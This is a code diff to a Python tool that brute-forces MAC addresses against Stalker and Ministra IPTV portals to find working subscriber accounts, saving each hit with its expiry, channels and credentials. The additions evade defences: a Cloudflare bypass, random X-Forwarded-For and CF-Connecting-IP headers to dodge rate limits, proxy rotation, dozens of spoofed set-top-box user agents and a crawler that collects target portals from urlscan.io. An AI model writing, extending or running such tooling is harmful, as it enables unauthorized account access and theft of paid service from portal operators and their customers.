@@ -12,6 +12,9 @@ import random
 import os
 import json
 import sqlite3
+import re
+import signal
+import sys
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
 import logging
@@ -21,7 +24,7 @@ import requests
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 
-import stb
+import stb_scanner
 
 logger = logging.getLogger(__name__)
 
@@ -39,21 +42,43 @@ def cached_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
 socket.getaddrinfo = cached_getaddrinfo
 logger.info("DNS caching enabled (1000 entries)")
 
-# 2. HTTP Connection Pooling (1.5-5x speedup)
-http_session = requests.Session()
-retry_strategy = Retry(
-    total=2,
-    backoff_factor=0.1,
-    status_forcelist=[429, 500, 502, 503, 504]
-)
-adapter = HTTPAdapter(
-    pool_connections=20,    # 20 connection pools
-    pool_maxsize=100,       # Max 100 connections per pool
-    max_retries=retry_strategy
-)
-http_session.mount("http://", adapter)
-http_session.mount("https://", adapter)
-logger.info("HTTP connection pooling enabled (20 pools, 100 connections)")
+# 2. HTTP Connection Pooling with Cloudscraper (1.5-5x speedup + Cloudflare bypass)
+try:
+    import cloudscraper
+    http_session = cloudscraper.create_scraper(
+        browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
+    )
+    # Add retry strategy to cloudscraper session
+    retry_strategy = Retry(
+        total=2,
+        backoff_factor=0.1,
+        status_forcelist=[429, 500, 502, 503, 504]
+    )
+    adapter = HTTPAdapter(
+        pool_connections=20,
+        pool_maxsize=100,
+        max_retries=retry_strategy
+    )
+    http_session.mount("http://", adapter)
+    http_session.mount("https://", adapter)
+    logger.info("✅ Cloudscraper enabled - Cloudflare bypass active (20 pools, 100 connections)")
+except ImportError:
+    # Fallback to standard requests if cloudscraper not installed
+    http_session = requests.Session()
+    retry_strategy = Retry(
+        total=2,
+        backoff_factor=0.1,
+        status_forcelist=[429, 500, 502, 503, 504]
+    )
+    adapter = HTTPAdapter(
+        pool_connections=20,
+        pool_maxsize=100,
+        max_retries=retry_strategy
+    )
+    http_session.mount("http://", adapter)
+    http_session.mount("https://", adapter)
+    logger.info("ℹ️ Cloudscraper not available - install with: pip install cloudscraper")
+    logger.info("HTTP connection pooling enabled (20 pools, 100 connections)")
 
 # 3. orjson for fast JSON parsing (5-10x speedup)
 try:
@@ -71,8 +96,8 @@ scanner_attacks = {}
 scanner_attacks_lock = threading.Lock()
 
 # Resource limits
-MAX_CONCURRENT_SCANS = 5
-MAX_RETRY_QUEUE_SIZE = 1000
+MAX_CONCURRENT_SCANS = 10  # Increased from 5 for better parallelism
+MAX_RETRY_QUEUE_SIZE = 5000  # Increased from 1000 for larger queues
 BATCH_WRITE_SIZE = 100          # Batch DB writes for performance
 BATCH_WRITE_INTERVAL = 5        # Flush batch every 5 seconds
 
@@ -98,6 +123,22 @@ DEFAULT_SCANNER_SETTINGS = {
     "require_channels_for_valid_hit": True,
     "min_channels_for_valid_hit": 1,
     "aggressive_phase1_retry": True,
+    "request_delay": 0,
+    "force_proxy_rotation_every": 0,
+    "user_agent_rotation": False,
+    "macattack_compatible_mode": False,
+    # NEW: Advanced Features
+    "cloudflare_bypass": True,
+    "random_x_forwarded_for": True,
+    "vpn_proxy_detection": False,
+    "deduplicate_mac_lists": True,
+    "generate_neighbor_macs": False,
+    "neighbor_mac_range": 5,
+    "auto_refresh_expiring": False,
+    "expiring_days_threshold": 7,
+    "scheduler_enabled": False,
+    "scheduler_start_time": "00:00",
+    "scheduler_end_time": "23:59",
 }
 
 # Scanner persistent data (Settings only, Hits in DB)
@@ -142,6 +183,7 @@ def init_scanner_db():
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 mac TEXT NOT NULL,
                 portal TEXT NOT NULL,
+                portal_type TEXT DEFAULT 'stalker_v1',
                 expiry TEXT,
                 channels INTEGER DEFAULT 0,
                 has_de BOOLEAN DEFAULT 0,
@@ -156,11 +198,36 @@ def init_scanner_db():
             )
         ''')
         
+        # Migration: Add portal_type column if it doesn't exist
+        try:
+            cursor.execute("SELECT portal_type FROM found_macs LIMIT 1")
+        except sqlite3.OperationalError:
+            logger.info("Migrating database: Adding portal_type column")
+            cursor.execute("ALTER TABLE found_macs ADD COLUMN portal_type TEXT DEFAULT 'stalker_v1'")
+            conn.commit()
+        
+        # Migration: Add VPN/Proxy detection columns if they don't exist
+        cursor.execute("PRAGMA table_info(found_macs)")
+        columns = [col[1] for col in cursor.fetchall()]
+        
+        if 'is_vpn' not in columns:
+            logger.info("Migrating database: Adding is_vpn column")
+            cursor.execute("ALTER TABLE found_macs ADD COLUMN is_vpn BOOLEAN DEFAULT 0")
+            conn.commit()
+        
+        if 'is_proxy' not in columns:
+            logger.info("Migrating database: Adding is_proxy column")
+            cursor.execute("ALTER TABLE found_macs ADD COLUMN is_proxy BOOLEAN DEFAULT 0")
+            conn.commit()
+        
         # Create indices for fast queries
         cursor.execute('CREATE INDEX IF NOT EXISTS idx_portal ON found_macs(portal)')
+        cursor.execute('CREATE INDEX IF NOT EXISTS idx_portal_type ON found_macs(portal_type)')
         cursor.execute('CREATE INDEX IF NOT EXISTS idx_has_de ON found_macs(has_de)')
         cursor.execute('CREATE INDEX IF NOT EXISTS idx_channels ON found_macs(channels)')
         cursor.execute('CREATE INDEX IF NOT EXISTS idx_found_at ON found_macs(found_at)')
+        cursor.execute('CREATE INDEX IF NOT EXISTS idx_is_vpn ON found_macs(is_vpn)')
+        cursor.execute('CREATE INDEX IF NOT EXISTS idx_is_proxy ON found_macs(is_proxy)')
         
         # Create genres table
         cursor.execute('''
@@ -452,12 +519,13 @@ class BatchWriter:
                 # Insert MAC
                 cursor.execute('''
                     INSERT OR REPLACE INTO found_macs 
-                    (mac, portal, expiry, channels, has_de, backend_url, username, password, 
+                    (mac, portal, portal_type, expiry, channels, has_de, backend_url, username, password, 
                      max_connections, created_at, client_ip, found_at)
-                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                 ''', (
                     hit_data['mac'],
                     hit_data['portal'],
+                    hit_data.get('portal_type', 'stalker_v1'),
                     hit_data.get('expiry'),
                     hit_data.get('channels', 0),
                     hit_data.get('has_de', False),
@@ -712,7 +780,657 @@ def generate_mac(prefix="00:1A:79:"):
     return f"{prefix}{suffix}"
 
 
-def create_scanner_state(portal_url, mode="random", mac_list=None, proxies=None, settings=None):
+def generate_neighbor_macs(base_mac, range_size=5):
+    """Generate neighbor MACs around a base MAC.
+    
+    Example:
+        base_mac = "00:1A:79:00:00:67"
+        range_size = 2
+        Returns: ["00:1A:79:00:00:65", "00:1A:79:00:00:66", "00:1A:79:00:00:67", 
+                  "00:1A:79:00:00:68", "00:1A:79:00:00:69"]
+    """
+    def mac_to_int(mac):
+        return int(mac.replace(":", ""), 16)
+    
+    def int_to_mac(num):
+        hex_str = f"{num:012X}"
+        return ":".join([hex_str[i:i+2] for i in range(0, 12, 2)])
+    
+    base_int = mac_to_int(base_mac)
+    neighbors = []
+    
+    for offset in range(-range_size, range_size + 1):
+        neighbor_int = base_int + offset
+        if neighbor_int >= 0:  # Ensure non-negative
+            neighbors.append(int_to_mac(neighbor_int))
+    
+    return neighbors
+
+
+def generate_random_ip():
+    """Generate random IP address for X-Forwarded-For header"""
+    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
+
+
+def get_cloudflare_headers(use_cloudflare_bypass=True, use_random_ip=True):
+    """Get Cloudflare bypass headers
+    
+    Based on FoxyMACScan CFR feature:
+    - Cloudflare-specific headers
+    - Random X-Forwarded-For IP
+    - Browser-like headers
+    """
+    headers = {}
+    
+    if use_cloudflare_bypass:
+        # Cloudflare bypass headers (from FoxyMACScan)
+        headers.update({
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9,de;q=0.8",
+            "Accept-Encoding": "gzip, deflate, br",
+            "DNT": "1",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1",
+            "Sec-Fetch-Dest": "document",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Site": "none",
+            "Sec-Fetch-User": "?1",
+            "Cache-Control": "max-age=0",
+            "TE": "trailers",
+        })
+    
+    if use_random_ip:
+        # Random X-Forwarded-For to bypass IP-based rate limiting
+        headers["X-Forwarded-For"] = generate_random_ip()
+        headers["X-Real-IP"] = generate_random_ip()
+        headers["CF-Connecting-IP"] = generate_random_ip()
+    
+    return headers
+
+
+def deduplicate_mac_list(mac_list):
+    """Remove duplicate MACs while preserving order"""
+    seen = set()
+    result = []
+    for mac in mac_list:
+        mac_normalized = mac.upper().strip()
+        if mac_normalized and mac_normalized not in seen:
+            seen.add(mac_normalized)
+            result.append(mac_normalized)
+    return result
+
+
+def generate_mac_range(start_mac, end_mac):
+    """Generate list of MACs from start to end range.
+    
+    Example:
+        start_mac = "00:1A:79:00:00:00"
+        end_mac = "00:1A:79:00:00:FF"
+        Returns: ["00:1A:79:00:00:00", "00:1A:79:00:00:01", ..., "00:1A:79:00:00:FF"]
+    """
+    def mac_to_int(mac):
+        """Convert MAC address to integer"""
+        return int(mac.replace(":", ""), 16)
+    
+    def int_to_mac(num):
+        """Convert integer to MAC address"""
+        hex_str = f"{num:012X}"
+        return ":".join([hex_str[i:i+2] for i in range(0, 12, 2)])
+    
+    start_int = mac_to_int(start_mac)
+    end_int = mac_to_int(end_mac)
+    
+    if start_int > end_int:
+        raise ValueError(f"start_mac ({start_mac}) must be <= end_mac ({end_mac})")
+    
+    # Limit range to prevent memory issues (max 1 million MACs)
+    range_size = end_int - start_int + 1
+    if range_size > 1_000_000:
+        raise ValueError(f"MAC range too large: {range_size:,} MACs (max: 1,000,000)")
+    
+    return [int_to_mac(i) for i in range(start_int, end_int + 1)]
+
+
+def crawl_portals_urlscan():
+    """Crawl new portals from urlscan.io API.
+    
+    Returns: List of portal URLs found
+    """
+    try:
+        base_url = "https://urlscan.io/api/v1/search/?q=filename%3A%22portal.php%3Ftype%3Dstb%26action%3Dhandshake%26token%3D%26prehash%3D0%26JsHttpRequest%3D1-xml%22"
+        
+        response = http_session.get(base_url, timeout=10)
+        response.raise_for_status()
+        data = response.json()
+        
+        portals = []
+        for entry in data.get('results', []):
+            if 'page' in entry and entry['page'].get('status') == "200":
+                url = entry['page']['url']
+                # Convert https to http
+                url = url.replace("https://", "http://")
+                portals.append(url)
+        
+        # Deduplicate
+        portals = list(set(portals))
+        
+        logger.info(f"✅ Found {len(portals)} portals from urlscan.io")
+        return portals
+    
+    except Exception as e:
+        logger.error(f"❌ Portal crawl failed: {e}")
+        return []
+
+
+def detect_vpn_proxy(portal_url, timeout=5):
+    """Detect if portal is behind VPN/Proxy using IP-API.com.
+    
+    Returns: {
+        "is_vpn": bool,
+        "is_proxy": bool,
+        "provider": str or None,
+        "confidence": float (0-1)
+    }
+    """
+    from urllib.parse import urlparse
+    
+    hostname = urlparse(portal_url).hostname
+    
+    try:
+        # IP-API.com (free, includes VPN/Proxy detection)
+        resp = http_session.get(
+            f"http://ip-api.com/json/{hostname}?fields=status,proxy,hosting",
+            timeout=timeout
+        )
+        data = resp.json()
+        
+        if data.get("status") == "success":
+            is_proxy = data.get("proxy", False)
+            is_hosting = data.get("hosting", False)
+            
+            return {
+                "is_vpn": is_hosting,  # Hosting = likely VPN/VPS
+                "is_proxy": is_proxy,
+                "provider": None,
+                "confidence": 0.8 if (is_proxy or is_hosting) else 0.9
+            }
+    except Exception as e:
+        logger.debug(f"VPN detection failed for {hostname}: {e}")
+    
+    # Fallback: Unknown
+    return {
+        "is_vpn": False,
+        "is_proxy": False,
+        "provider": None,
+        "confidence": 0.0
+    }
+
+
+def auto_detect_portal_url(base_url, proxy=None, timeout=5):
+    """Auto-detect portal endpoint (from MacAttackWeb-NEW).
+    
+    Tries common portal endpoints:
+    - /c/version.js (Ministra/MAG)
+    - /stalker_portal/c/version.js (Stalker)
+    
+    Returns: (detected_url, portal_type, version)
+    """
+    from urllib.parse import urlparse
+    
+    base_url = base_url.rstrip('/')
+    parsed = urlparse(base_url)
+    host = parsed.hostname
+    port = parsed.port or 80
+    scheme = parsed.scheme or "http"
+    
+    # If already has /c in path, return as-is
+    if '/c' in parsed.path:
+        return base_url, "ministra", "5.3.1"
+    
+    clean = f"{scheme}://{host}:{port}"
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    
+    # Try common endpoints
+    endpoints = [
+        ("/c/", "ministra"),
+        ("/stalker_portal/c/", "stalker"),
+    ]
+    
+    for endpoint, portal_type in endpoints:
+        try:
+            resp = http_session.get(
+                f"{clean}{endpoint}version.js",
+                proxies=proxies,
+                timeout=timeout,
+                verify=False
+            )
+            if resp.status_code == 200 and "var ver" in resp.text:
+                # Extract version
+                match = re.search(r"var ver = ['\"](.+?)['\"]", resp.text)
+                version = match.group(1) if match else "5.3.1"
+                detected_url = f"{clean}{endpoint.rstrip('/')}"
+                logger.info(f"✅ Auto-detected portal: {detected_url} (Type: {portal_type}, Version: {version})")
+                return detected_url, portal_type, version
+        except Exception as e:
+            logger.debug(f"Endpoint {endpoint} failed: {e}")
+            continue
+    
+    # Default fallback
+    logger.warning(f"⚠️ Could not auto-detect portal, using default: {clean}/c")
+    return f"{clean}/c", "ministra", "5.3.1"
+
+
+def detect_portal_type(portal_url, response_text=None):
+    """Auto-detect portal type based on URL and response.
+    
+    Returns: portal_type (str) - One of:
+        - stalker_v1: Standard Stalker portal.php
+        - stalker_v2: Stalker stalker_portal/server/load.php
+        - stalker_v3: Stalker with signature/metrics
+        - xtream: Xtream Codes (Username/Password) - SKIP
+        - xui: XUI Panel (Username/Password) - SKIP
+        - ministra: Ministra TV Platform
+        - flussonic: Flussonic Media Server
+        - tvip: TVIP Middleware
+        - infomir: Infomir MAG Portal
+        - smartiptv: Smart IPTV Portal
+        - ottplayer: OTT Player Portal
+        - unknown: Cannot determine
+    
+    Note: Only MAC-based portals (Stalker variants, Ministra, etc.) are supported.
+          Xtream/XUI use Username/Password and are skipped.
+    """
+    url_lower = portal_url.lower()
+    
+    # Check for non-MAC portals (skip these)
+    if "player_api.php" in url_lower:
+        return "xtream"  # Username/Password based
+    elif "panel_api.php" in url_lower:
+        return "xui"  # Username/Password based
+    
+    # Check for Stalker variants (MAC-based)
+    if "stalker_portal" in url_lower:
+        return "stalker_v2"
+    elif "portal.php" in url_lower or "/c/" in url_lower:
+        # Check response to differentiate v1 vs v3
+        if response_text:
+            if "signature" in response_text or "metrics" in response_text:
+                return "stalker_v3"
+        return "stalker_v1"
+    
+    # Check for other MAC-based portals
+    if "ministra" in url_lower or "middleware" in url_lower:
+        return "ministra"
+    elif "flussonic" in url_lower:
+        return "flussonic"
+    elif "tvip" in url_lower:
+        return "tvip"
+    elif "infomir" in url_lower or "mag" in url_lower:
+        return "infomir"
+    elif "smartiptv" in url_lower or "siptv" in url_lower:
+        return "smartiptv"
+    elif "ottplayer" in url_lower or "ott" in url_lower:
+        return "ottplayer"
+    
+    return "unknown"
+
+
+def get_portal_config(portal_type):
+    """Get portal-specific configuration (headers, cookies, etc).
+    
+    Based on OpenBullet2's 45 portal configurations with optimized handshake settings.
+    
+    Returns: dict with portal-specific settings
+    """
+    configs = {
+        # Stalker Variants
+        "stalker_v1": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
+            "requires_signature": False,
+            "requires_metrics": False,
+            "headers": {
+                "X-User-Agent": "Model: MAG250; Link: WiFi",
+            }
+        },
+        "stalker_v2": {
+            "endpoint": "stalker_portal/server/load.php",
+            "user_agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 2 rev: 250 Safari/533.3",
+            "requires_signature": False,
+            "requires_metrics": False,
+            "headers": {
+                "X-User-Agent": "Model: MAG250; Link: Ethernet",
+            }
+        },
+        "stalker_v3": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 2 rev: 250 Safari/533.3",
+            "requires_signature": True,
+            "requires_metrics": True,
+            "headers": {
+                "X-User-Agent": "Model: MAG322; Link: WiFi",
+            }
+        },
+        
+        # Ministra Variants
+        "ministra": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG254 stbapp ver: 2 rev: 250 Safari/533.3",
+            "requires_signature": False,
+            "requires_metrics": False,
+            "headers": {
+                "X-User-Agent": "Model: MAG254; Link: Ethernet",
+            }
+        },
+        
+        # Infomir MAG Portals
+        "infomir": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 2 rev: 250 Safari/533.3",
+            "requires_signature": False,
+            "requires_metrics": False,
+            "headers": {
+                "X-User-Agent": "Model: MAG322; Link: WiFi",
+            }
+        },
+        
+        # Flussonic
+        "flussonic": {
+            "endpoint": "stalker_portal/server/load.php",
+            "user_agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 2 rev: 250 Safari/533.3",
+            "requires_signature": False,
+            "requires_metrics": False,
+            "headers": {
+                "X-User-Agent": "Model: MAG250; Link: Ethernet",
+            }
+        },
+        
+        # TVIP
+        "tvip": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; Android 7.1.2; TVIP S-Box v.605) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36",
+            "requires_signature": False,
+            "requires_metrics": False,
+            "headers": {
+                "X-User-Agent": "Model: TVIP S-Box v.605; Link: Ethernet",
+            }
+        },
+        
+        # Smart IPTV
+        "smartiptv": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (SMART-TV; Linux; Tizen 4.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/56.0.2924.0 TV Safari/537.36",
+            "requires_signature": False,
+            "requires_metrics": False,
+            "headers": {
+                "X-User-Agent": "Model: SmartTV; Link: WiFi",
+            }
+        },
+        
+        # OTT Player
+        "ottplayer": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; Android 9; BRAVIA 4K VH2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36",
+            "requires_signature": False,
+            "requires_metrics": False,
+            "headers": {
+                "X-User-Agent": "Model: OTT Player; Link: WiFi",
+            }
+        },
+        
+        # Additional Portal Types (from OpenBullet2)
+        "aura_hd": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 2 rev: 250 Safari/533.3",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "formuler": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Formuler Z8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "dreambox": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Dreambox",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "enigma2": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Enigma2",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "zgemma": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Zgemma",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "vu_plus": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) VuPlus",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "octagon": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Octagon SF8008) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "gigablue": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) GigaBlue",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "edision": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Edision OS) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "maxytec": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Maxytec",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "azbox": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) AZBox",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "openatv": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) OpenATV",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "openpli": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) OpenPLi",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "openvix": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) OpenViX",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "openbox": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) OpenBox",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "amiko": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Amiko A4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "ferguson": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Ferguson Ariva) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "strong": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Strong SRT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "technomate": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) TechnoMate",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "xtrend": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Xtrend",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "mutant": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Mutant",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "beyonwiz": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Beyonwiz",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "uclan": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Uclan Denys) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "spycat": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Spycat",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "axas": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Axas",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "dinobot": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Dinobot U5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "protek": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Protek",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "air_digital": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) AirDigital",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "wwio": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) WWIO",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "ebox": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Ebox) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "miraclebox": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) MiracleBox",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "atemio": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Atemio",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "xp1000": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) XP1000",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "osmini": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) OSMini",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "osmio": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) OSMio",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "osninova": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) OSNinova",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "osmega": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) OSMega",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "edision_os": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; Android 7.0; Edision OS) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "iqon": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) iQon",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "ceryon": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Ceryon",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+        "xpeed": {
+            "endpoint": "portal.php",
+            "user_agent": "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Xpeed",
+            "requires_signature": False,
+            "requires_metrics": False,
+        },
+    }
+    
+    return configs.get(portal_type, configs["stalker_v1"])
+
+
+def create_scanner_state(portal_url, mode="random", mac_list=None, mac_range_start=None, mac_range_end=None, proxies=None, settings=None):
     """Create scanner attack state"""
     
     # Handle refresh mode: Load MACs from database for this portal
